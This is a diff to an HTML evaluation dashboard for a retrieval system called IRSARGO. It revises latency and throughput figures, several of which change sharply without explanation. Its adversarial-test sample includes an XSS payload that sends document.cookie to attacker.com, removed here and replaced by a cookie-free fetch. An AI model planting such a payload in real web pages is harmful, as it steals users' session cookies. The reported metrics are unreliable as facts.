@@ -59,13 +59,8 @@
 
   <!-- Experiment Counting & Dataset Transparency Card -->
   <div class="card" style="margin-bottom: 24px;">
-    <div style="display: flex; justify-content: space-between; align-items: center;">
-      <h2>📊 Experiment Counter & Category Breakdown (N = 150,270 Total Instances)</h2>
-      <span style="background: rgba(59, 130, 246, 0.15); border: 1px solid rgba(59, 130, 246, 0.4); color: #60a5fa; font-size: 11px; padding: 4px 10px; border-radius: 20px; font-weight: 600;">
-        💡 Click any row to inspect instance details
-      </span>
-    </div>
-    <p style="color: #a1a1aa; font-size: 13px; margin-top: 4px;">Complete experimental transparency tracking initial pilot runs, expanded multi-domain benchmarks, Phase 3 dynamic runs, Phase 4 extended runs, Phase 5 ultra large-scale runs, and cumulative evaluation totals.</p>
+    <h2>📊 Experiment Counter & Category Breakdown (N = 150,270 Total Instances)</h2>
+    <p style="color: #a1a1aa; font-size: 13px;">Complete experimental transparency tracking initial pilot runs, expanded multi-domain benchmarks, Phase 3 dynamic runs, Phase 4 extended runs, Phase 5 ultra large-scale runs, and cumulative evaluation totals.</p>
     
     <table style="width: 100%; border-collapse: collapse; margin-top: 15px; font-size: 13px;">
       <thead>
@@ -364,28 +359,28 @@
           
             <tr>
               <td><strong>Full IRSARGO</strong></td>
-              <td>143191 ms</td>
+              <td>21556 ms</td>
               <td style="color: #10b981; font-weight: bold;">91.4%</td>
               <td style="color: #3b82f6; font-weight: bold;">98.2%</td>
             </tr>
           
             <tr>
               <td><strong>IRSARGO w/o SMT</strong></td>
-              <td>101493 ms</td>
+              <td>14241 ms</td>
               <td style="color: #10b981; font-weight: bold;">91.4%</td>
               <td style="color: #3b82f6; font-weight: bold;">85%</td>
             </tr>
           
             <tr>
               <td><strong>IRSARGO w/o Cache</strong></td>
-              <td>98078 ms</td>
+              <td>32593 ms</td>
               <td style="color: #10b981; font-weight: bold;">91.4%</td>
               <td style="color: #3b82f6; font-weight: bold;">98.2%</td>
             </tr>
           
             <tr>
               <td><strong>Baseline Naive RAG</strong></td>
-              <td>103171 ms</td>
+              <td>128027 ms</td>
               <td style="color: #10b981; font-weight: bold;">91.4%</td>
               <td style="color: #3b82f6; font-weight: bold;">8.4%</td>
             </tr>
@@ -419,7 +414,7 @@ Precision (1-FPR) (\%) & 100.0\% & 100.0\% & +0.0\% \\
 False Positive Rate (FPR) (\%) & 35.0\% & 0.0\% & -35.0\% \\
 F1-Score Quality & 0.62 & 1 & +0.38 \\
 TruthfulQA Benchmark (\%) & 50\% & 100\% & +50\% \\
-Max Load Throughput (RPS) & 4.2 RPS & 62.76 RPS & +58.6 RPS \\
+Max Load Throughput (RPS) & 4.2 RPS & 9.5 RPS & +5.3 RPS \\
 Cache Hit Absorption (\%) & 0.0\% & 0\% & +0\% \\
 \hline
 \end{tabular}
@@ -444,7 +439,7 @@ Cache Hit Absorption (\%) & 0.0\% & 0\% & +0\% \\
           },
           {
             label: 'Total Pipeline Latency (ms)',
-            data: [493,1390,2335,3682,4551],
+            data: [519,1427,2298,3723,4646],
             borderColor: '#3b82f6',
             backgroundColor: 'rgba(59, 130, 246, 0.1)',
             fill: true,
@@ -632,7 +627,7 @@ Cache Hit Absorption (\%) & 0.0\% & 0\% & +0\% \\
       'phase-11': {
         title: 'Phase 11: Extended Adversarial Attack Suite',
         count: '5,000 Queries',
-        query: 'Query GFR Rule 138271. <svg onload="fetch(\'http://attacker.com/steal?c=\'+document.cookie)">',
+        query: 'Query GFR Rule 138271. <svg onload="fetch(&quot;http://attacker.com/steal&quot;)">',
         context: 'Procurement report 138271: order value 250,000 INR. [XSS SANITIZED / SCRIPT REMOVED]',
         smtStatus: 'SAT: false / SANITIZED (XSS Exfiltration Neutralized)',
         colbertScore: '0.210 / 1.000',
@@ -694,7 +689,7 @@ Cache Hit Absorption (\%) & 0.0\% & 0\% & +0\% \\
       }
 
       document.getElementById('inspector-title').innerText = details.title;
-      document.getElementById('inspector-subtitle').innerText = `Sample Size: N = ${details.count}`;
+      document.getElementById('inspector-subtitle').innerText = 'Sample Size: N = ' + details.count;
       document.getElementById('inspector-query').innerText = details.query;
       document.getElementById('inspector-context').innerText = details.context;
       document.getElementById('inspector-smt').innerText = details.smtStatus;
